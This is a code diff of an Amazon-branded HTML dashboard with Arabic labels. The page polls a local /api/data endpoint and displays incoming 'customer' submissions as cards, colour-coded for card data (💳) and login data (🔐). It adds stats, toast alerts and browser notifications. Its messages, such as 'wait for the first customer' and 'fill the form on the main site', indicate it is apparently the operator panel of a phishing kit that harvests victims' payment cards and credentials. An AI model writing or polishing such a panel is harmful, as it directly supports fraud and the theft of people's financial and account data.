@@ -7,125 +7,211 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background: #F3F3F3; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: linear-gradient(135deg, #F3F3F3 0%, #E8E8E8 100%);
+            min-height: 100vh;
+        }
+        
         .data-box {
             background: white;
             border-radius: 16px;
-            padding: 20px;
+            padding: 24px;
             margin-bottom: 16px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-            border-right: 4px solid #FF9900;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            border-right: 5px solid #FF9900;
             animation: slideIn 0.5s ease;
             white-space: pre-wrap;
             font-family: 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.6;
+            font-size: 14px;
+            line-height: 1.8;
+            transition: all 0.3s ease;
         }
+        .data-box:hover {
+            transform: translateX(-4px);
+            box-shadow: 0 8px 24px rgba(255, 153, 0, 0.15);
+        }
+        
         @keyframes slideIn {
             from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .notification-badge {
-            background: #FF9900;
-            color: white;
-            border-radius: 50%;
-            padding: 2px 8px;
-            font-size: 12px;
-            margin-right: 8px;
-        }
+        
         .header {
-            background: #131A22;
+            background: linear-gradient(135deg, #131A22 0%, #1A2533 100%);
             color: white;
-            padding: 16px;
-            border-bottom: 2px solid #232F3E;
+            padding: 20px 24px;
+            border-bottom: 3px solid #FF9900;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
         }
+        
         .refresh-btn {
-            background: #FF9900;
+            background: linear-gradient(135deg, #FF9900 0%, #FFB84D 100%);
             color: white;
             border: none;
-            padding: 8px 20px;
-            border-radius: 8px;
+            padding: 10px 24px;
+            border-radius: 10px;
             cursor: pointer;
             font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(255, 153, 0, 0.3);
         }
         .refresh-btn:hover {
-            background: #FFB84D;
+            transform: scale(1.05);
+            box-shadow: 0 4px 16px rgba(255, 153, 0, 0.4);
         }
+        .refresh-btn:active {
+            transform: scale(0.95);
+        }
+        
         .toast {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #22c55e;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
             color: white;
-            padding: 12px 24px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            padding: 16px 28px;
+            border-radius: 14px;
+            box-shadow: 0 8px 32px rgba(34, 197, 94, 0.3);
             display: none;
             animation: slideUp 0.5s ease;
             z-index: 1000;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            font-weight: 600;
+            border: 1px solid rgba(255,255,255,0.2);
         }
         .toast.show {
             display: block;
         }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        
         .loading {
             text-align: center;
-            padding: 40px;
+            padding: 60px 20px;
             color: #666;
         }
         .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #FF9900;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FF9900;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 16px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .badge {
+            background: #FF9900;
+            color: white;
+            border-radius: 50%;
+            padding: 2px 10px;
+            font-size: 13px;
+            font-weight: bold;
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .empty-state {
+            background: white;
+            border-radius: 20px;
+            padding: 60px 40px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+        }
+        .empty-state .icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        
+        .section-title {
+            background: linear-gradient(135deg, #FF9900 0%, #FFB84D 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            font-size: 18px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 12px;
+            padding: 12px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
     </style>
 </head>
 <body>
 
-    <div class="header flex justify-between items-center">
-        <div class="flex items-center gap-2">
-            <span class="text-xl font-black text-[#FF9900]">amazon</span>
-            <span class="text-sm text-white/70">| عرض البيانات</span>
+    <!-- ====== HEADER ====== -->
+    <div class="header flex flex-wrap justify-between items-center gap-3">
+        <div class="flex items-center gap-3">
+            <span class="text-2xl font-black text-[#FF9900]">amazon</span>
+            <span class="text-sm text-white/70 bg-white/10 px-3 py-1 rounded-full">📊 عرض البيانات</span>
         </div>
-        <div>
-            <span id="notificationCount" class="notification-badge" style="display:none;">0</span>
-            <button onclick="fetchData()" class="refresh-btn">🔄 تحديث</button>
+        <div class="flex items-center gap-3">
+            <span id="notificationBadge" class="badge" style="display:none;">0</span>
+            <button onclick="fetchData()" class="refresh-btn">
+                🔄 تحديث الآن
+            </button>
         </div>
     </div>
 
-    <main class="max-w-4xl mx-auto p-4">
-        <div class="flex justify-between items-center mb-4">
-            <h1 class="text-2xl font-bold">📊 سجل البيانات</h1>
-            <span class="text-sm text-gray-500" id="lastUpdate">آخر تحديث: --</span>
+    <!-- ====== MAIN ====== -->
+    <main class="max-w-5xl mx-auto p-4 md:p-6">
+
+        <!-- ====== Stats ====== -->
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+            <div class="stat-card text-center">
+                <div class="text-2xl font-bold text-[#FF9900]" id="totalEntries">0</div>
+                <div class="text-xs text-gray-500">عدد الإدخالات</div>
+            </div>
+            <div class="stat-card text-center">
+                <div class="text-2xl font-bold text-green-600" id="lastEntryTime">--</div>
+                <div class="text-xs text-gray-500">آخر إدخال</div>
+            </div>
+            <div class="stat-card text-center">
+                <div class="text-2xl font-bold text-blue-600" id="todayEntries">0</div>
+                <div class="text-xs text-gray-500">اليوم</div>
+            </div>
+            <div class="stat-card text-center">
+                <div class="text-2xl font-bold text-purple-600" id="statusBadge">🟢</div>
+                <div class="text-xs text-gray-500">الحالة</div>
+            </div>
         </div>
 
+        <!-- ====== Title ====== -->
+        <div class="flex justify-between items-center mb-4">
+            <h1 class="text-2xl font-bold text-[#111111]">📋 سجل البيانات</h1>
+            <span class="text-sm text-gray-400" id="lastUpdate">آخر تحديث: --</span>
+        </div>
+
+        <!-- ====== Data Container ====== -->
         <div id="dataContainer">
             <div class="loading">
                 <div class="spinner"></div>
-                <p>جاري تحميل البيانات...</p>
+                <p class="text-gray-500">جاري تحميل البيانات...</p>
             </div>
         </div>
     </main>
 
-    <!-- Toast Notification -->
+    <!-- ====== TOAST ====== -->
     <div id="toast" class="toast">✅ بيانات جديدة وصلت!</div>
 
+    <!-- ====== JAVASCRIPT ====== -->
     <script>
         let lastData = '';
         let notificationCount = 0;
 
-        // ========== جلب البيانات ==========
         async function fetchData() {
             try {
                 const response = await fetch('/api/data');
@@ -134,75 +220,120 @@
                 if (data !== lastData) {
                     lastData = data;
                     displayData(data);
-                    showNotification();
+                    if (data.trim()) {
+                        showNotification();
+                    }
                 }
                 
                 document.getElementById('lastUpdate').textContent = `آخر تحديث: ${new Date().toLocaleTimeString('ar-EG')}`;
+                
+                // تحديث الإحصائيات
+                updateStats(data);
+                
             } catch (error) {
-                console.error('خطأ في جلب البيانات:', error);
-                document.getElementById('dataContainer').innerHTML = 
-                    `<div class="bg-red-50 border border-red-200 text-red-700 p-4 rounded-xl">❌ خطأ في جلب البيانات</div>`;
+                console.error('خطأ:', error);
+                document.getElementById('dataContainer').innerHTML = `
+                    <div class="bg-red-50 border-2 border-red-200 text-red-700 p-6 rounded-2xl text-center">
+                        <div class="text-4xl mb-3">⚠️</div>
+                        <h3 class="font-bold text-lg">خطأ في جلب البيانات</h3>
+                        <p class="text-sm">تأكد من اتصال الإنترنت وحاول مرة أخرى</p>
+                        <button onclick="fetchData()" class="mt-4 bg-red-600 text-white px-6 py-2 rounded-lg hover:bg-red-700">
+                            🔄 إعادة المحاولة
+                        </button>
+                    </div>
+                `;
+                document.getElementById('statusBadge').textContent = '🔴';
             }
         }
 
-        // ========== عرض البيانات ==========
         function displayData(data) {
             const container = document.getElementById('dataContainer');
             
             if (!data || data.trim() === '') {
                 container.innerHTML = `
-                    <div class="bg-yellow-50 border border-yellow-200 text-yellow-700 p-6 rounded-xl text-center">
-                        📭 لا توجد بيانات حتى الآن
-                        <br>
-                        <span class="text-sm">انتظر وصول أول عميل...</span>
+                    <div class="empty-state">
+                        <div class="icon">📭</div>
+                        <h3 class="text-2xl font-bold text-gray-700 mb-2">لا توجد بيانات</h3>
+                        <p class="text-gray-400">انتظر وصول أول عميل...</p>
+                        <div class="mt-4 text-sm text-gray-300">
+                            💡 جرب تملأ الفورم على 
+                            <a href="/" class="text-[#FF9900] font-bold hover:underline">الموقع الرئيسي</a>
+                        </div>
                     </div>
                 `;
                 return;
             }
 
-            // تقسيم البيانات إلى أقسام (كل قسم بين ======)
+            // تقسيم البيانات
             const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
             
             let html = '';
             sections.forEach((section, index) => {
-                const lines = section.split('\n').filter(line => line.trim());
-                // استخراج العنوان (أول سطرين)
-                let title = 'بيانات جديدة';
-                let content = section;
-                
-                // محاولة استخراج العنوان
+                let title = '📝 بيانات جديدة';
                 const titleMatch = section.match(/📋.*|💳.*|🔐.*/);
                 if (titleMatch) {
                     title = titleMatch[0];
                 }
                 
-                // إزالة الأسطر الفارغة الزائدة
-                content = section.replace(/^={50,}\n/, '').replace(/\n={50,}$/, '');
+                let content = section.replace(/^={50,}\n/, '').replace(/\n={50,}$/, '');
+                
+                // ألوان مختلفة حسب النوع
+                let borderColor = '#FF9900';
+                let bgColor = '#FFF8F0';
+                if (title.includes('💳')) {
+                    borderColor = '#22c55e';
+                    bgColor = '#F0FFF4';
+                } else if (title.includes('🔐')) {
+                    borderColor = '#8b5cf6';
+                    bgColor = '#F5F0FF';
+                }
                 
                 html += `
-                    <div class="data-box" id="section-${index}">
-                        <div class="text-sm font-bold text-[#FF9900] mb-2">${title}</div>
-                        <div class="text-gray-700">${content}</div>
+                    <div class="data-box" style="border-right-color: ${borderColor}; background: ${bgColor};" id="section-${index}">
+                        <div class="text-sm font-bold mb-3" style="color: ${borderColor};">
+                            ${title}
+                        </div>
+                        <div class="text-gray-700" style="font-size: 14px; line-height: 1.8;">
+                            ${content}
+                        </div>
                     </div>
                 `;
             });
 
             container.innerHTML = html;
+            document.getElementById('statusBadge').textContent = '🟢';
         }
 
-        // ========== إظهار الإشعار ==========
+        function updateStats(data) {
+            const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
+            document.getElementById('totalEntries').textContent = sections.length;
+            
+            if (sections.length > 0) {
+                const lastSection = sections[sections.length - 1];
+                const timeMatch = lastSection.match(/🕐 الوقت: (.+)/);
+                if (timeMatch) {
+                    document.getElementById('lastEntryTime').textContent = timeMatch[1];
+                }
+                
+                // عدد إدخالات اليوم
+                const today = new Date().toLocaleDateString('ar-EG');
+                let todayCount = 0;
+                sections.forEach(s => {
+                    if (s.includes(today)) todayCount++;
+                });
+                document.getElementById('todayEntries').textContent = todayCount;
+            }
+        }
+
         function showNotification() {
-            // Toast notification
             const toast = document.getElementById('toast');
             toast.classList.add('show');
             
-            // تحديث عداد الإشعارات
             notificationCount++;
-            const badge = document.getElementById('notificationCount');
+            const badge = document.getElementById('notificationBadge');
             badge.style.display = 'inline';
             badge.textContent = notificationCount;
             
-            // إشعار المتصفح (Browser Notification)
             if (Notification.permission === 'granted') {
                 new Notification('📬 بيانات جديدة وصلت!', {
                     body: 'تم استلام بيانات جديدة من العميل',
@@ -210,22 +341,23 @@
                 });
             }
             
-            // إخفاء الـ Toast بعد 3 ثواني
             setTimeout(() => {
                 toast.classList.remove('show');
-            }, 3000);
+            }, 4000);
         }
 
-        // ========== طلب إذن الإشعارات ==========
+        // طلب إذن الإشعارات
         if (Notification.permission === 'default') {
             Notification.requestPermission();
         }
 
-        // ========== التحديث التلقائي كل 10 ثواني ==========
+        // التحميل الأول
         fetchData();
+
+        // التحديث التلقائي كل 10 ثواني
         setInterval(fetchData, 10000);
 
-        // ========== تحديث عند العودة للصفحة ==========
+        // تحديث عند العودة للصفحة
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
                 fetchData();
